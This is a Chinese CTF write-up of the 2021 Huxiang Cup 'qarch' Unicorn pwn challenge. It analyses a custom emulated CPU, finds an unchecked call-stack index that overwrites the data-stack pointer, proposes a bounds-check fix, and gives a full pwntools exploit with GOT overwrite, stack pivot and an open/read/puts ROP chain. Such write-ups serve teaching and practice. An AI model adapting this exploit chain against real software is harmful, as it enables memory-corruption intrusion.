---
layout:     post   				    # 使用的布局（不需要改）
title:      Unicorn Pwn - 湖湘杯2021 final qarch 		 # 标题 
subtitle:   Unicorn Pwn - 湖湘杯2021 final qarch               # 副标题
date:       2021-12-07 				# 时间
author:     Mr.R 					# 作者
# header-img: img/post-bg-2015.jpg 	# 这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								# 标签
    - CTF
    - Pwn

---

# Unicorn Pwn - 湖湘杯2021 final qarch

时隔半年的再一次更新.jpg

福湘杯线下遇到的unicorn pwn，赛场中拿到了修复一血，但是exp没有写完，继续写exp之后来留一下。

## 总览

题目使用了QOM之类的技术实现了一个自己写的arch。由于赛前并没有很深的了解过这种东西，还是遇到了一些麻烦的，本篇文章会以一个做题者的角度来对其进行分析。

## qarch程序分析

程序主体逻辑还是十分清晰的。

1. 使用prctl将execve系统调用禁用
2. 对unicorn进行初始化
   1. 在0x10000处(虚拟地址)分配了一块可读写的空间
   
   2. 自行设置code段的地址(虚拟地址)
   
   3. 输入code
   
   4. 设置了一个syscall hook，可以进行任意地址的读写(虚拟地址)
   
      ```c
      		uc_reg_read(a1, 1LL, &cmd);
          uc_reg_read(a1, 2LL, &ptr);
          uc_reg_read(a1, 3LL, &size);
          if ( size > 0x1000 )
          {
            puts("size invalid");
            exit(-1);
          }
          if ( cmd == 1 )
          {
            readn(buf, size);
            if ( uc_mem_write(a1, ptr, buf, size) )
            {
              puts("failed to read data");
              exit(-1);
            }
          }
          else if ( cmd == 2 )
          {
            if ( (unsigned int)uc_mem_read(a1, ptr, buf, size) )
            {
              puts("failed to write data");
              exit(-1);
            }
            write(1, buf, size);
          }
      ```
   
      控制三个寄存器即可。
3. 进行执行，并打印出执行错误

## CPU

```c
#define CALL_STACK_SIZE 0x100

typedef struct CPUQARCHState {
    uint64_t regs[16];
    uint64_t pc;
    uint64_t sp;
    uint64_t call_sp;

    /* Condition flags.  */
    uint32_t flags;


    uint64_t call_stack[CALL_STACK_SIZE];
    uint64_t* stack;

    CPU_COMMON

    /* Fields from here on are preserved across CPU reset. */
    uint32_t features;

    // Unicorn engine
    struct uc_struct *uc;
} CPUQARCHState;
```

根据CPU定义，可以看到它具有多个寄存器。

1.16个通用寄存器

2.1个pc寄存器

3.1个sp寄存器

4.1个call_sp寄存器

5.一个flags寄存器

6.一个call_stack空间

7.一个stack指针

看出这个cpu中函数调用栈与数据栈是分开存放的。

## 初始化&执行

uc_open处对虚拟机进行了初始化，看到其初始化函数就是`qarch_uc_init`

dummy_qrach_init中对寄存器的值进行了简单的初始化，**可以看到他的栈是通过malloc申请出来的真实地址，而不是虚拟机内部的虚拟地址**

```c
int __cdecl dummy_qarch_init(uc_struct_0 *uc, MachineState_2 *machine)
{
  const char *cpu_model; // [rsp+10h] [rbp-10h]
  CPUQARCHState_0 *env; // [rsp+18h] [rbp-8h]

  cpu_model = machine->cpu_model;
  if ( !cpu_model )
    cpu_model = "any";
  env = cpu_init(uc, cpu_model);
  if ( env )
  {
    env->pc = 0LL;
    env->sp = 0LL;
    env->call_sp = 0LL;
    env->flags = 0;
    memset(env->call_stack, 0, sizeof(env->call_stack));
    env->stack = (uint64_t *)malloc(0x1008uLL);
    return 0;
  }
  else
  {
    fwrite("Unable to find qarch CPU definition\n", 1uLL, 0x24uLL, stderr);
    return -1;
  }
}
```

cpu_init中对opcode进行了初始化。

```c
void __cdecl register_qarch_insns(CPUQARCHState_0 *env)
{
  TCGContext_0 *tcg_ctx; // [rsp+10h] [rbp-8h]

  tcg_ctx = (TCGContext_0 *)env->uc->tcg_ctx;
  register_opcode(tcg_ctx, (disas_proc)disas_halt, 0);
  register_opcode(tcg_ctx, (disas_proc)disas_mov, 1u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 2u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 3u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 4u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 5u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 6u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 7u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 8u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 9u);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 0xAu);
  register_opcode(tcg_ctx, (disas_proc)disas_alu, 0xBu);
  register_opcode(tcg_ctx, (disas_proc)disas_not, 0xCu);
  register_opcode(tcg_ctx, (disas_proc)disas_pop, 0xDu);
  register_opcode(tcg_ctx, (disas_proc)disas_push, 0xEu);
  register_opcode(tcg_ctx, (disas_proc)disas_call, 0x10u);
  register_opcode(tcg_ctx, (disas_proc)disas_ret, 0x11u);
  register_opcode(tcg_ctx, (disas_proc)disas_cmp, 0x12u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x13u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x14u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x15u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x16u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x17u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x18u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x19u);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x1Au);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x1Bu);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x1Cu);
  register_opcode(tcg_ctx, (disas_proc)disas_j, 0x1Du);
  register_opcode(tcg_ctx, (disas_proc)disas_syscall, 0x20u);
}
```

执行函数是uc_emu_start

```c
  if ( uca->arch == UC_ARCH_QARCH )
    uc_reg_write(uca, 0x12, &begina, timeout);
```

此处通过uc_reg_write函数对PC进行了初始化。

然后通过vm_start_qarch进行正式执行

## 指令分析

简单看一下，逆一下，就可以发现指令的操作是在`op_helper.c`中定义的

其中的HELPER(xxx)就是对xxx指令的定义

实现的指令在上面都可以看到，主要是

1.ALU(各种运算)

​	支持寄存器-立即数，寄存器-寄存器

2.not(寄存器取反)

3.pop(从栈上向寄存器取值)

4.push(从寄存器向栈上存值)

5.call(进行函数调用)

​    寄存器或者立即数

6.ret(函数返回)

7.cmp(判断)

8.j(跳转)

9.mov

​	支持寄存器-寄存器，寄存器-地址，地址-寄存器，寄存器-立即数

​	这是个漏网之鱼，在源码中并没有helper_mov，需要看disas_mov。

对挨个函数进行漏洞分析，重点关注的是pop，push，call，ret等对数组的操作

发现pop与push都对sp寄存器进行了限制。

但是call，ret指令却没有对call_sp进行限制。

```c
void HELPER(call)(CPUQARCHState* env, uint64_t value, uint64_t next_pc, uint32_t mode)
{
    if(!mode) 
    {
        uint8_t reg = value & 0xf;
        env->pc = env->regs[reg];
    }
    else
    {
        env->pc = value + next_pc;
    }
    env->call_stack[env->call_sp] = next_pc;
    env->call_sp++;
}

```

而根据上文中看到的cpu结构，call_stack只有0x100，也就是说如果进行多次call，就会导致call_stack越界。

而与call_stack相邻的就是数据栈指针，也就是说可以将数据栈指针进行覆盖。

## 修复方案

修复还是比较简单的，我选择在call指令下方设置完call_sp++以后加入了一个对call_sp的检测，如果产生了越界就让程序exit退出。

效果看起来还不错，一发入魂。

## 漏洞利用-预备工作

漏洞利用的前提是还原出虚拟机opcode的格式，并写出汇编器。但是unicorn的vm_start主体代码过于庞大，很难一步到位找到他对code进行解析的位置。通过对helper_xxx的交叉引用，发现其入口点就是disas_xxx，在通过调试查看backtrace。

```
#0  disas_mov (env=0x1d53038, s=0x7ffcbc18bff0, op=1 '\001') at /home/ctf/unicorn-1.0.3/qemu/target-qarch/translate.c:227
#1  0x00007f227efe522f in disas_qarch_insn (env=0x1d53038, s=0x7ffcbc18bff0) at /home/ctf/unicorn-1.0.3/qemu/target-qarch/translate.c:451
#2  0x00007f227efe560f in gen_intermediate_code_internal_qarch (cpu=0x1d4ae10, tb=0x7f227d663178, search_pc=false) at /home/ctf/unicorn-1.0.3/qemu/target-qarch/translate.c:541
#3  0x00007f227efe5848 in gen_intermediate_code_qarch (env=0x1d53038, tb=0x7f227d663178) at /home/ctf/unicorn-1.0.3/qemu/target-qarch/translate.c:599
#4  0x00007f227efac3ce in cpu_qarch_gen_code (env=0x1d53038, tb=0x7f227d663178, gen_code_size_ptr=0x7ffcbc18c0d0) at /home/ctf/unicorn-1.0.3/qemu/translate-all.c:213
#5  0x00007f227efad665 in tb_gen_code_qarch (cpu=0x1d4ae10, pc=6299712, cs_base=0, flags=0, cflags=0) at /home/ctf/unicorn-1.0.3/qemu/translate-all.c:1152
#6  0x00007f227efaee44 in tb_find_slow_qarch (env=0x1d53038, pc=6299712, cs_base=0, flags=0) at /home/ctf/unicorn-1.0.3/qemu/cpu-exec.c:414
#7  0x00007f227efaefd7 in tb_find_fast_qarch (env=0x1d53038) at /home/ctf/unicorn-1.0.3/qemu/cpu-exec.c:445
#8  0x00007f227efae8a7 in cpu_qarch_exec (uc=0x1d44260, env=0x1d53038) at /home/ctf/unicorn-1.0.3/qemu/cpu-exec.c:224
#9  0x00007f227efd1a91 in tcg_cpu_exec_qarch (uc=0x1d44260, env=0x1d53038) at /home/ctf/unicorn-1.0.3/qemu/cpus.c:120
#10 0x00007f227efd1af8 in tcg_exec_all_qarch (uc=0x1d44260) at /home/ctf/unicorn-1.0.3/qemu/cpus.c:135
#11 0x00007f227efd1a2c in qemu_tcg_cpu_loop (uc=0x1d44260) at /home/ctf/unicorn-1.0.3/qemu/cpus.c:104
#12 0x00007f227efd1990 in resume_all_vcpus_qarch (uc=0x1d44260) at /home/ctf/unicorn-1.0.3/qemu/cpus.c:78
#13 0x00007f227efd18c2 in vm_start_qarch (uc=0x1d44260) at /home/ctf/unicorn-1.0.3/qemu/cpus.c:46
#14 0x00007f227efe846e in uc_emu_start (uc=0x1d44260, begin=6299648, until=6303743, timeout=0, count=0) at ../uc.c:683
#15 0x000000000040129e in ?? ()
#16 0x00007f227e9a2bf7 in __libc_start_main (main=0x401230, argc=1, argv=0x7ffcbc18c4a8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffcbc18c498) at ../csu/libc-start.c:310
#17 0x0000000000400b3a in ?? ()
```

发现这个函数`disas_qarch_insn`

```c
void __cdecl disas_qarch_insn(CPUQARCHState_0 *env, DisasContext_0 *s)
{
  uint8_t op; // [rsp+17h] [rbp-9h]
  TCGContext *tcg_ctx; // [rsp+18h] [rbp-8h]

  tcg_ctx = s->uc->tcg_ctx;
  if ( qemu_loglevel_mask_qarch_0(12) )
    tcg_gen_debug_insn_start_qarch(tcg_ctx, s->pc);
  if ( s->pc == s->uc->addr_end )
    goto LABEL_9;
  if ( hook_exists_bounded_0(env->uc->hook[2].head, s->pc) )
  {
    gen_uc_tracecode(tcg_ctx, -235802127, 2, env->uc, s->pc);
    check_exit_request_qarch(tcg_ctx);
  }
  op = cpu_ldub_code_qarch_0(env, s->pc);
  ++s->pc;
  if ( op > 0x20u || !tcg_ctx->qarch_opcode_table[op] )
LABEL_9:
    gen_exception_qarch(s, s->pc, (int)&loc_10001);
  else
    ((void (__fastcall *)(CPUQARCHState_0 *, DisasContext_0 *, _QWORD))tcg_ctx->qarch_opcode_table[op])(env, s, op);
}
```

op如果不是0x20，就会根据opcode_table进行查找跳转。

而opcode_table就是在register_qarch_insns进行注册的。

相关的disas_xxx函数在`translate.c`中，进行简单分析。

发现了几个重要的代码

1.load_b，load_w，load_l，load_q

```c
static uint8_t load_b(CPUQARCHState *env, DisasContext *s)
{
    uint8_t data = cpu_ldub_code(env, s->pc);
    s->pc += 1;
    return data;
}
```

猜测得出这个就是从代码中取1byte

其他几个分别是2,4,8，对应BYTE，WORD，DWORD，QWORD

2.get_imm

```c
static TCGv get_imm(TCGContext* tcg_ctx, CPUQARCHState* env, DisasContext *s, uint32_t data_length)
{
    TCGv imm;
    if(data_length == 0)
        imm = tcg_const_i64(tcg_ctx, load_b(env, s));
    if(data_length == 1)
        imm = tcg_const_i64(tcg_ctx, load_w(env, s));
    if(data_length == 2)
        imm = tcg_const_i64(tcg_ctx, load_l(env, s));
    if(data_length == 3)
        imm = tcg_const_i64(tcg_ctx, load_q(env, s));
    return imm;
}

```

根据data_length进行取立即数操作。

3.op_switch & data_length

以disas_call为例

```c
DISAS_INSN(call)
{
    TCGContext *tcg_ctx = s->uc->tcg_ctx; 
    uint8_t op_switch = load_b(env, s);
    uint8_t data_length = op_switch >> 4;
    TCGv dst;

    if(op_switch == 0)
        dst = tcg_const_i64(tcg_ctx, load_b(env, s)&0xf);
    else
        dst = get_imm(tcg_ctx, env, s, data_length);
    gen_helper_call(tcg_ctx, tcg_ctx->cpu_env, dst, 
            tcg_const_i64(tcg_ctx, s->pc), tcg_const_i32(tcg_ctx, op_switch));
    s->is_jmp = DISAS_JUMP;
}
```

```c
void HELPER(call)(CPUQARCHState* env, uint64_t value, uint64_t next_pc, uint32_t mode)
{
    if(!mode) 
    {
        uint8_t reg = value & 0xf;
        env->pc = env->regs[reg];
    }
    else
    {
        env->pc = value + next_pc;
    }
    env->call_stack[env->call_sp] = next_pc;
    env->call_sp++;
}
```

可以看到op_switch代表的就是数据类型，用于标识是寄存器还是立即数，0为寄存器，其他为立即数。

data_length用于标识后面取立即数的长度，两个合起来作为1byte。

即call的opcode格式为

op data_length<<4|op_switch num

其他指令也都类似，按照以上进行分析就可以得出其指令格式。

## 漏洞利用-详细过程

首先，当前可做的事情是通过call_stack的溢出，来越界写到stack指针。

但是由于call的特性，写到stack指针的值将会是一个虚拟地址。

而根据上文中的cpu_init

`    env->stack = (uint64_t *)malloc(0x1008uLL);`

这里应该是一个真实地址，否则在pop，push的时候就会出现错误。

乍一看，这个是无法利用的漏洞。但是回过头来看主程序，就会发现qarch程序是没有开启PIE的，而且got表可写。

那么就引申出了一个利用思路，在主程序中分配虚拟代码空间的时候，将其直接分配至0x602000。

这样在进行越界的时候就可以将stack修改为当前的PC值(0x602000+xxxx)，产生虚拟机逃逸，访问到宿主机.bss段的数据。

### 尝试1

#### 思路

直接使用257次call，然后使用push，pop对bss操作。

#### 结果

由于call是将pc写入，257次call的opcode长度会比较长，超过了got表处，无法劫持控制流。

### 尝试2

#### 思路

不再申请到0x602000，而选择申请至0x601000，这样PC即使比较大，也不会超过0x602000，配合填充其他指令将其抬到0x602000即可。

#### 结果

申请0x601000的时候产生了错误，无法成功分配。简单尝试了一下发现，分配的地址要是0x2000的倍数才可以正常分配。

### 尝试3

#### 思路

申请至0x600000，虽然opcode长度只能是0x1000，肯定访问不到0x602000，但是通过syscall可以继续向代码段写入数据，从而使opcode变长

#### 结果

似乎出了一些问题，在尝试的时候uc_mem_write失败了。

### 尝试4

#### 思路

没有办法使用暴力的操作了，只好手撕汇编，利用cmp和j，写了一个循环，使造成溢出的时候pc仍处于比较小的位置，可以继续对got进行覆盖

#### 结果

思路可行，可以成功将stack指针覆盖到got表部分，但是又遇到一个新的问题，PC不是0x8对齐的。分析后发现，push和pop的指令长度其实是3，通过多个push操作，成功将指针达到0x8对齐。



现在可以对got表进行覆盖了，接下来就要根据主函数的逻辑来考虑覆盖哪些东西了。

由于禁用了execve，所以后续还要进行orw的利用。

### 赛中思路

覆盖`uc_strerror`为0x400E42，覆盖`setbuf`为`setcontext+53`,然后使unicorn报错退出回到setbuf的位置。

此时rdi是bss上stdin指针内的值，通过覆盖stdin指向bss，再伪造srop的sigreturn frame就可以进一步栈迁移进行orw。

但是遇到的问题就是，不能在bss上连续写入，只能用push一点点写，赛场上也是因为这个导致心态爆炸exp没写完。

### 赛后思路

回到学校清醒了一下脑子，重新调整思路，发现在赛中是钻了牛角尖。rax,rdi的值都是可控的，同时libc中存在有`xchg eax,esp;ret`这种gadget，其实是可以直接进行任意地址的栈迁移，不需要借助srop来调整寄存器布局。而且bss上的code同样可控，在输入opcode的时候，后面部署上rop链，虽然没有打印出来libc地址，但是只需要借助正常的ret2libc重新泄漏，栈迁移也可以完成。

(当然其实配合mov操作与syscall，在虚拟机中进行任意地址读，就可以泄漏libc地址，但是懒得写了)

### 最终exp

```python
from pwn import *

BYTE = 0 << 4
WORD = 1 << 4
DWORD = 2 << 4
QWORD = 3 << 4

REG = 0
MEM = 1


def getImm(op_switch, dst):
    if(op_switch == BYTE):
        return p8(dst)
    elif(op_switch == WORD):
        return p16(dst)
    elif(op_switch == DWORD):
        return p32(dst)
    elif(op_switch == QWORD):
        return p64(dst)


def call(type=REG, imm=BYTE, dst=0):
    opcode = p8(0x10)
    opcode += p8(imm+type)
    opcode += getImm(imm, dst)
    return opcode


def push(type=REG, imm=BYTE, dst=0):
    opcode = p8(0xe)
    opcode += p8(imm+type)
    opcode += getImm(imm, dst)
    return opcode


def pop(type=REG, imm=BYTE, dst=0):
    opcode = p8(0xd)
    opcode += p8(imm+type)
    opcode += getImm(imm, dst)
    return opcode


def mov(reg=0, imm=BYTE, dst=0):
    opcode = p8(1)
    opcode += p8(imm+3)
    opcode += p8(reg)
    opcode += getImm(imm, dst)
    return opcode


def add(type=REG, imm=BYTE, dst=0, value=0):
    opcode = p8(2)
    opcode += p8(type+imm)
    opcode += p8(dst)
    opcode += getImm(imm, value)
    return opcode


def cmp(type=REG, imm=BYTE, dst=0, value=0):
    opcode = p8(0x12)
    opcode += p8(type+imm)
    opcode += p8(dst)
    opcode += getImm(imm, value)
    return opcode


def jnz(type=REG, imm=BYTE, dst=0):
    opcode = p8(0x15)
    opcode += p8(type+imm)
    opcode += getImm(imm, dst)
    return opcode


def syscall(ax):
    opcode = p8(0x20)+p8(ax)
    return opcode

libc = ELF("./lib/libc-2.27.so")
elf = ELF("./qarch")
context.arch = 'amd64'

payload = [
    call(MEM, 0, 0),
    add(MEM, BYTE, 0, 1),
    cmp(MEM, WORD, 0, 256),
    jnz(MEM, QWORD, -0x16 & 0xffffffffffffffff),
    push()*7,
    push()*6,
    call(MEM, 0, 0),
    pop(REG,BYTE,1),
    pop(REG,BYTE,1),
    pop(REG,BYTE,1),
    add(MEM,QWORD,1,(-264128)&0xffffffffffffffff),
    pop()*7,
    mov(0,QWORD,0),
    add(REG,BYTE,0,1),
    add(MEM,QWORD,0,0x0000000000046d7e), #xchg eax,esp
    push(0),
    push(0)*3,
    mov(0,DWORD,elf.plt['read']+6), #read_plt
    push(0),
    mov(0,DWORD,0x400E42),
    push(0)*6,
    mov(0,DWORD,0x6020d0),
    push()*4,
    mov(0,DWORD,0x602120+0x500),
    push(),
    mov(2,DWORD,0x2000),
    syscall(1)
]

# payload = call(MEM, 0, 0)++cmp(MEM, WORD, 0, 256)
pop_rdi = 0x0000000000401343
pop_rsi_r15 = 0x0000000000401341
pop_rsp_3 = 0x000000000040133d
readn = 0x400BF7
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']


payload = flat(payload)
payload = payload.ljust(0x500,'\x00')+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
payload += p64(pop_rdi)+p64(elf.bss()+0x1000-8)+p64(pop_rsi_r15)+p64(0x500)*2+p64(readn)
payload += p64(pop_rsp_3)+p64(elf.bss()+0x1000-3*8)

s = process("./qarch", env={'LD_PRELOAD': "./lib/libunicorn.so.1"})

s.sendlineafter("Base Address?", str(0x602000))
s.sendafter("Code size?", str(len(payload)))
# gdb.attach(s, "b *0x400ceb\nc")
# gdb.attach(s,"b disas_mov\nc")
# gdb.attach(s,"b *0x400ceb\nb helper_push\nc")

s.sendafter("Code:", payload)
libc.address = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00")-libc.sym['puts']
success(hex(libc.address))

payload = './flag\x00\x00'+p64(pop_rdi)+p64(elf.bss()+0x1000-8)+p64(pop_rsi_r15)+p64(0)*2+p64(libc.sym['open'])
payload += p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(elf.bss()+0x500)*2+p64(next(libc.search(asm('pop rdx;ret;'))))+p64(0x100)+p64(libc.sym['read'])
payload += p64(pop_rdi)+p64(elf.bss()+0x500)+p64(libc.sym['puts'])
raw_input(">")
s.send(payload.ljust(0x500,'\x00'))

s.interactive()

```

## 总结

感觉这道题目还是很有意思的，结合unicorn，把传统的vm题目变得更符合实际。

对我而言这个题的做题体验度远超另外两个libc大师题目(

